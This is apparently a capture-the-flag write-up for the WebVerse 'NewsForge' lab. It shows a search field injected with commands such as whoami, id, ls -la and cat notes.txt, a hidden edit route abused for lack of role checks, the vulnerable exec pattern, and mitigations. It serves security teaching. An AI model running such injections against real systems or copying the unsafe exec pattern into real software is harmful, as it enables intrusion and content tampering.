---
title: "Command Injection & Broken Function Level Authorization | NewsForge"
date: 2026-05-15 10:40:00 +0530
categories: [A05 - Injection, Command Injection]
tags: [command-injection, bfla, idor, authorization, nodejs, burp-suite, webversepro]
author: Shivansh Sharma
platform: WebVerse
image:
  path: /assets/images/posts/newsforge.webp
  alt: NewsForge WebVerse Lab
---

# Command Injection & Broken Function Level Authorization | NewsForge

## Overview

NewsForge is a WebVerse Labs challenge focused on two major vulnerabilities:

- Command Injection through the search functionality
- Broken Function Level Authorization (BFLA) on article editing routes

The application allows users to browse and search technology-related articles. During testing, the search feature revealed unsafe backend command execution behavior, which ultimately exposed hidden developer notes and an undisclosed administrative route.

The exposed route allowed unauthorized users to edit articles without proper privilege validation.

## Lab Link

- Lab: [NewsForge – WebVerse](https://dashboard.webverselabs-pro.com/labs/newsforge)

---

## Objective

Exploit the vulnerable search functionality to gain deeper application insight, discover hidden administrative functionality, and abuse broken authorization controls to retrieve the flag.

---

## Hosts Configuration

Add the lab hostname locally before accessing the application.

```bash
echo "10.100.0.30    newsforge.local" | sudo tee -a /etc/hosts
```

---

## Initial Reconnaissance

After opening the application:

```text
http://newsforge.local/
```

The platform allowed standard user registration and login.

### Registration

```text
http://newsforge.local/register
```

### Login

```text
http://newsforge.local/login
```

After authentication, the application exposed a search feature.

```text
http://newsforge.local/search
```

---

## Discovering Command Injection

Testing the search functionality quickly revealed suspicious behavior.

Basic operating system commands were executed directly through the search input.

### Payloads Used

```bash
whoami
```

```bash
id
```

### Response

```text
newsforge
uid=1001(newsforge) gid=1001(newsforge) groups=1001(newsforge)
```

The command output was reflected directly in the user interface, confirming command injection.

This indicated the backend was likely executing user input unsafely through shell commands.

---

## Enumerating the Server

After confirming remote command execution, directory contents were listed.

### Payload

```bash
ls -la
```

### Response

```text
total 88
drwxr-xr-x    1 newsforge newsforge      4096 May 14 08:29 .
drwxr-xr-x    1 root     root          4096 May 14 12:52 ..
-rw-r--r--    1 newsforge newsforge       570 May 14 08:28 Dockerfile
-rw-r--r--    1 newsforge newsforge       513 May 14 08:28 README.md
drwxr-xr-x    1 newsforge newsforge      4096 May 14 12:52 db
drwxr-xr-x    1 newsforge newsforge      4096 May  4 20:45 node_modules
-rw-r--r--    1 newsforge newsforge       452 May 14 08:28 notes.txt
-rw-r--r--    1 newsforge newsforge     34472 May 14 08:28 package-lock.json
-rw-r--r--    1 newsforge newsforge       296 May 14 08:28 package.json
drwxr-xr-x    1 newsforge newsforge      4096 May 14 08:29 public
-rw-r--r--    1 newsforge newsforge      4948 May 14 08:28 server.js
drwxr-xr-x    1 newsforge newsforge      4096 May 14 08:29 views
```

A file named `notes.txt` appeared particularly interesting.

---

## Reading Sensitive Internal Notes

The developer notes were read using:

```bash
cat notes.txt
```

### Output

```text
NewsForge - Developer Notes
============================
Last updated: 2025-03-12 - Kevin

TODO before next release:
--------------------------
[ ] Article editing: add a role check to /9ead47a82a0d25985f22f10651d1f93b3abba317 routes - currently any logged-in
    user can edit articles. Is it a security flaw that anyone can visit /9ead47a82a0d25985f22f10651d1f93b3abba317
    and edit articles? Need to restrict to admin role only before going live.
```

This revealed a hidden route:

```text
/9ead47a82a0d25985f22f10651d1f93b3abba317
```

The note also confirmed a Broken Function Level Authorization issue where any authenticated user could access article editing functionality.

---

## Exploiting Broken Function Level Authorization

An existing article was opened:

```text
http://newsforge.local/article/article3
```

The hidden endpoint was then appended to the article URL:

```text
http://newsforge.local/article/article3/9ead47a82a0d25985f22f10651d1f93b3abba317
```

Even though the logged-in account was a regular user, the application exposed article editing functionality without authorization checks.

A small modification was made to the article content and the changes were saved.

---

## Retrieving the Flag

After saving the article changes, the flag appeared directly in the application interface.

```text
WEBVERSE{REDACTED}
```

---

## Proof of Exploitation

### Command Injection

```bash
whoami
id
ls -la
cat notes.txt
```

### Hidden Administrative Route

```text
/9ead47a82a0d25985f22f10651d1f93b3abba317
```

### Unauthorized Article Editing

```text
http://newsforge.local/article/article3/9ead47a82a0d25985f22f10651d1f93b3abba317
```

### Result

- Remote command execution
- Internal file disclosure
- Hidden route discovery
- Authorization bypass
- Unauthorized article modification
- Flag retrieval

---

## Vulnerability Analysis

### Command Injection

The search feature likely passed user input directly into a shell command without sanitization.

A vulnerable pattern commonly looks like:

```javascript
exec("grep " + userInput)
```

This allows attackers to execute arbitrary operating system commands.

---

### Broken Function Level Authorization

The application exposed privileged editing functionality without verifying user roles.

Although the route appeared hidden through obscurity, no actual authorization enforcement existed.

Simply knowing the endpoint granted access.

---

## Impact

Successful exploitation allowed attackers to:

- Execute arbitrary system commands
- Enumerate server contents
- Read sensitive internal files
- Discover hidden administrative routes
- Modify application content
- Bypass intended access controls

In real-world applications, this could lead to:

- Full server compromise
- Credential theft
- Data manipulation
- Persistent backdoors
- Privilege escalation

---

## Mitigation

### Prevent Command Injection

Avoid executing shell commands with unsanitized user input.

Use safe APIs instead of shell execution whenever possible.

#### Unsafe

```javascript
exec("grep " + userInput)
```

#### Safer

```javascript
execFile("grep", [userInput])
```

---

### Enforce Authorization Checks

Every privileged endpoint must verify user permissions server-side.

Never rely on:

- Hidden URLs
- Obscure routes
- Frontend restrictions

Authorization should always be enforced in backend logic.

---

### Principle of Least Privilege

Regular users should only have access to functionality explicitly required for their role.

---

## Real-World Insight

This lab combines two extremely dangerous vulnerabilities often found together in real environments.

Command injection frequently exposes internal files, secrets, or undocumented endpoints that attackers can chain into deeper compromise.

The second issue demonstrates why "security through obscurity" fails. Even though the edit route looked random and hidden, it remained fully accessible because authorization was never enforced.

Modern attackers regularly combine information disclosure with authorization flaws to move laterally through applications.

---

## Key Takeaways

- Search functionality can become dangerous when tied to shell commands
- Hidden routes are not security controls
- Authorization must always be enforced server-side
- Internal notes and debug files often expose critical information
- Chaining smaller issues frequently leads to full compromise